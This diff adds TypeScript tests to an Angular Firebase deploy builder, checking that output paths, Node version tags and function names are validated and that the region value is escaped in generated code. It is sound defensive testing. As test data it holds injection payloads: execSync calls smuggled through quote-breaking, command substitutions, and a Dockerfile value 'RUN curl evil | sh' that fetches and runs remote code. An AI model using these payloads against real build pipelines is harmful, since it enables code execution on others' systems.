@@ -1,9 +1,10 @@
 /* eslint-disable @typescript-eslint/no-empty-function */
 import { join } from 'path';
+import { Script } from 'vm';
 import { BuilderContext, BuilderRun, ScheduleOptions, Target } from '@angular-devkit/architect';
 import { JsonObject, logging } from '@angular-devkit/core';
 import { BuildTarget, DeployBuilderSchema, FSHost, FirebaseDeployConfig, FirebaseTools } from '../interfaces';
-import deploy, { assertSafeDependencyName, assertSupportedPackageManager, buildCloudRunBuildsSubmitArgs, buildCloudRunDeployArgs, deployToFunction, findPackageVersion, processHost } from './actions.js'
+import deploy, { assertSafeDependencyName, assertSafeFunctionName, assertSafeNodeVersion, assertSafeOutputPath, assertSupportedPackageManager, buildCloudRunBuildsSubmitArgs, buildCloudRunDeployArgs, deployToCloudRun, deployToFunction, findPackageVersion, processHost } from './actions.js'
 import 'jasmine';
 
 let context: BuilderContext;
@@ -427,5 +428,207 @@ describe('deploy input validation (command-injection hardening)', () => {
         .toThrowError(/Invalid dependency name/);
       expect(runSpy).not.toHaveBeenCalled();
     });
+  });
+});
+
+describe('generated artifact validation (codegen-injection hardening)', () => {
+  describe('assertSafeOutputPath', () => {
+    [
+      'dist/browser', 'dist/server', 'dist/my-app/browser', 'out', 'a.b-c_d/e', '../dist/browser',
+      // Only a shell would act on these, and the one place the path reaches a shell is the
+      // generated start script, which quotes it. So they are unusual directory names rather
+      // than a way through, and rejecting them would break a deploy that works today.
+      'dist/my app', 'dist/*', 'dist/?pp', 'dist/[ab]', '~/x', 'dist\tserver', 'a;b', 'a|b',
+    ].forEach((outputPath) => {
+      it(`allows the valid outputPath ${JSON.stringify(outputPath)}`, () => {
+        expect(() => assertSafeOutputPath(outputPath, 'proj:server')).not.toThrow();
+      });
+    });
+
+    [
+      `x'); require('child_process').execSync('id'); ('`,
+      'a`id`', 'a$(id)', 'a$HOME', 'a\nb', 'a\rb', 'a"b', 'a\\b', '-rf',
+    ].forEach((outputPath) => {
+      it(`rejects the unsafe outputPath ${JSON.stringify(outputPath)}`, () => {
+        expect(() => assertSafeOutputPath(outputPath, 'proj:server')).toThrowError(/Unsafe outputPath/);
+      });
+    });
+  });
+
+  describe('assertSafeNodeVersion', () => {
+    // A Docker tag, since the Cloud Run path renders it as `FROM node:<version>-slim`.
+    [undefined, 18, 20, '18', '18.19', '20.11.1', 'lts', 'current', 'iron', '22-bookworm'].forEach((version) => {
+      it(`allows the valid functionsNodeVersion ${JSON.stringify(version)}`, () => {
+        expect(() => assertSafeNodeVersion(version)).not.toThrow();
+      });
+    });
+
+    [
+      '18-slim\nRUN curl evil | sh', '18 && id', '18;id', '$(id)', '`id`', '18/../x', 'x:y', 'x@sha256',
+      // Grammatical, but node:latest-slim has never been published.
+      'latest',
+      // Docker caps a tag at 128 characters.
+      '2'.repeat(129),
+    ].forEach((version) => {
+      it(`rejects the unsafe functionsNodeVersion ${JSON.stringify(version)}`, () => {
+        expect(() => assertSafeNodeVersion(version)).toThrowError(/Unsafe functionsNodeVersion/);
+      });
+    });
+  });
+
+  describe('assertSafeFunctionName', () => {
+    // These are the names that can actually arrive: the schema pattern for functionName is
+    // the wider Cloud Run service-ID rule, and this is the JavaScript-identifier rule the
+    // Cloud Functions path needs on top of it.
+    [undefined, 'ssr', 'ssrHandler', 'a1', 'my_fn'].forEach((functionName) => {
+      it(`allows the valid functionName ${JSON.stringify(functionName)}`, () => {
+        expect(() => assertSafeFunctionName(functionName)).not.toThrow();
+      });
+    });
+
+    [`ssr; require('child_process').execSync('id'); var _x`, 'my-fn', 'a b', '1fn', 'a.b', `a'`].forEach((functionName) => {
+      it(`rejects the unsafe functionName ${JSON.stringify(functionName)}`, () => {
+        expect(() => assertSafeFunctionName(functionName)).toThrowError(/Unsafe functionName/);
+      });
+    });
+  });
+});
+
+// Runs a generated index.js against stubs, recording what it required and what it ran, so a
+// payload that escaped its context is caught by having executed rather than by how it reads.
+const runGeneratedFunction = (source: string) => {
+  const required: string[] = [];
+  const executed: string[] = [];
+  const stub: Record<string, any> = {
+    app: () => ({}),
+    https: { onRequest: (app: unknown) => app },
+    execSync: (command: string) => { executed.push(command); return ''; },
+  };
+  stub.region = () => stub;
+  stub.runWith = () => stub;
+  const exports: Record<string, unknown> = {};
+  const run = () => new Script(source).runInNewContext({
+    exports,
+    module: { exports },
+    require: (id: string) => { required.push(id); return stub; },
+  });
+  return { required, executed, exports, run };
+};
+
+// These drive the builders end-to-end so the protection cannot be silently dropped: every
+// assertSafe* call site in deployToFunction / deployToCloudRun is covered by a spec here
+// that fails if that call is removed, and so is the region escaping in the template. That
+// includes the static build target, whose outputPath only ever reaches the filesystem and
+// so has nothing exploitable to assert beyond the rejection itself.
+describe('generated artifact validation is wired into the builders', () => {
+  beforeEach(() => initMocks());
+
+  const withOutputPaths = (
+    staticOutputPath: string,
+    serverOutputPath: string,
+  ): BuilderContext['getTargetOptions'] => (target: Target) => {
+    if (target.target === 'build') { return Promise.resolve({ outputPath: staticOutputPath }); }
+    if (target.target === 'server') { return Promise.resolve({ outputPath: serverOutputPath }); }
+    // Matches architect, which throws rather than handing back options-less targets.
+    throw new Error(`Invalid target: ${JSON.stringify(target)}.`);
+  };
+
+  const withServerOutputPath = (outputPath: string) => withOutputPaths('dist/browser', outputPath);
+  const withStaticOutputPath = (outputPath: string) => withOutputPaths(outputPath, 'dist/server');
+
+  const EVIL_PATH = `dist'); require('child_process').execSync('id'); ('`;
+
+  it('deployToFunction rejects a hostile server outputPath', async () => {
+    context.getTargetOptions = withServerOutputPath(EVIL_PATH);
+    await expectAsync(deployToFunction(
+      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
+      { preview: false }, undefined, fsHost
+    )).toBeRejectedWithError(/Unsafe outputPath/);
+  });
+
+  it('deployToFunction rejects a hostile static outputPath', async () => {
+    context.getTargetOptions = withStaticOutputPath(EVIL_PATH);
+    await expectAsync(deployToFunction(
+      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
+      { preview: false }, undefined, fsHost
+    )).toBeRejectedWithError(/Unsafe outputPath/);
+  });
+
+  it('deployToFunction rejects a server outputPath that starts with a dash', async () => {
+    context.getTargetOptions = withServerOutputPath('-rf');
+    await expectAsync(deployToFunction(
+      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
+      { preview: false }, undefined, fsHost
+    )).toBeRejectedWithError(/Unsafe outputPath/);
+  });
+
+  it('deployToFunction rejects a functionName that is not a plain identifier', async () => {
+    await expectAsync(deployToFunction(
+      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
+      { preview: false, functionName: `ssr; require('child_process').execSync('id'); var _x` },
+      undefined, fsHost
+    )).toBeRejectedWithError(/Unsafe functionName/);
+  });
+
+  it('deployToFunction escapes region into the generated function instead of interpolating it raw', async () => {
+    const spy = spyOn(fsHost, 'writeFileSync');
+    const region = `us-central1'); require('child_process').execSync('id'); ('`;
+    await deployToFunction(
+      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
+      { preview: false, region }, undefined, fsHost
+    );
+    // By path rather than by call order, so adding or reordering a write does not silently
+    // point this at the wrong file.
+    const write = spy.calls.allArgs().find(([path]) => path.endsWith('index.js'));
+    if (!write) { throw new Error('deployToFunction wrote no index.js'); }
+    const indexJs = write[1];
+    expect(indexJs).toContain(`.region(${JSON.stringify(region)})`);
+
+    // Interpolated raw, the payload closes `.region('` and the require becomes a statement
+    // of its own, which runs when the function loads. Rendered through the fixed template it
+    // stays inside a string literal, so running the source touches neither.
+    const generated = runGeneratedFunction(indexJs);
+    expect(generated.run).not.toThrow();
+    expect(generated.executed).toEqual([]);
+    expect(generated.required).not.toContain('child_process');
+    expect(Object.keys(generated.exports)).toEqual(['ssr']);
+  });
+
+  it('deployToCloudRun rejects a hostile server outputPath', async () => {
+    context.getTargetOptions = withServerOutputPath(EVIL_PATH);
+    await expectAsync(deployToCloudRun(
+      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
+      { preview: false }, undefined, fsHost
+    )).toBeRejectedWithError(/Unsafe outputPath/);
+  });
+
+  it('deployToCloudRun rejects a hostile static outputPath', async () => {
+    context.getTargetOptions = withStaticOutputPath(EVIL_PATH);
+    await expectAsync(deployToCloudRun(
+      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
+      { preview: false }, undefined, fsHost
+    )).toBeRejectedWithError(/Unsafe outputPath/);
+  });
+
+  it('deployToCloudRun rejects a hostile functionsNodeVersion', async () => {
+    await expectAsync(deployToCloudRun(
+      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
+      { preview: false, functionsNodeVersion: '18-slim\nRUN curl evil | sh' }, undefined, fsHost
+    )).toBeRejectedWithError(/Unsafe functionsNodeVersion/);
+  });
+
+  it('deployToCloudRun rejects a hostile functionsNodeVersion before touching the output directory', async () => {
+    const removeSpy = spyOn(fsHost, 'removeSync');
+    const copySpy = spyOn(fsHost, 'copySync');
+    const writeSpy = spyOn(fsHost, 'writeFileSync');
+
+    await expectAsync(deployToCloudRun(
+      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
+      { preview: false, functionsNodeVersion: '18-slim\nRUN curl evil | sh' }, undefined, fsHost
+    )).toBeRejectedWithError(/Unsafe functionsNodeVersion/);
+
+    expect(removeSpy).not.toHaveBeenCalled();
+    expect(copySpy).not.toHaveBeenCalled();
+    expect(writeSpy).not.toHaveBeenCalled();
   });
 });
